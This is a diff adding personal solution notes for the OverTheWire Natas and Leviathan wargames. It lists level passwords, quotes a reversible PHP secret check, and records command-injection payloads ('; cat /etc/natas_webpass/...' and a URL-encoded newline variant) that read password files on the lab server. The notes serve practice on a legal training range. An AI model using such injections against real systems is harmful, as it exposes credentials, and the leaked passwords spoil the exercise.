@@ -1,0 +1,50 @@
+level5:
+iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+
+level6:
+aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+
+level7:
+7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+level8:
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+
+function encodeSecret($secret) {
+    return bin2hex(strrev(base64_encode($secret)));
+}
+
+if(array_key_exists("submit", $_POST)) {
+    if(encodeSecret($_POST['secret']) == $encodedSecret) {
+    print "Access granted. The password for natas9 is <censored>";
+    } else {
+    print "Wrong secret";
+    }
+}
+
+level9:
+W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
+
+; cat /etc/natas_webpass/natas10 #
+
+
+level 10:
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+; cat /etc/natas_webpass/natas11 #
+http://natas10.natas.labs.overthewire.org/?needle=%0A+cat+%2Fetc%2Fnatas_webpass%2Fnatas11+%23&submit=Search
+
+
+level 11:
+U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+
+
+
+leviathan 1:
+<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" L
+AST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
